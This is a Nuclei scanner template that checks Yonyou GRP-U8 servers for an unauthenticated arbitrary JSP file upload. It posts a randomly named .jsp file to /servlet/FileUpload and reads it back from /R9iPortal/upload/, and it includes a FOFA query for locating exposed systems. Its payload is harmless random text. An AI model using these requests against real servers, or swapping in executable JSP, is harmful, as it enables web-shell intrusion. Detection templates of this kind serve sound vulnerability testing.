id: yonyou-grp-u8-fileupload

info:
  name: 用友 GRP U8 FileUpload - fileupload
  author: mczilong
  severity: critical
  description:
  reference:
    - https://mp.weixin.qq.com
  metadata:
    verified: true
    fofa-qeury: app="用友-GRP-U8" || title="用友GRP-U8行政事业内控管理软件" || icon_hash="-299520369"
  tags: yonyou,grpu8,oa

variables:
  file_name: "{{to_lower(rand_text_alpha(8))}}.jsp"
  file_content: "{{to_lower(rand_text_alpha(26))}}"

http:
  - raw:
      - |
        POST /servlet/FileUpload?fileName={{file_name}}&actionID=update HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Content-Type: multipart/form-data; boundary=---------------------------32840991842344344364451981273
        Content-Length: 4
        Origin: null
        Connection: close
        Upgrade-Insecure-Requests: 1

        {{file_content}}

      - |
        GET /R9iPortal/upload/{{file_name}} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "{{file_content}}"
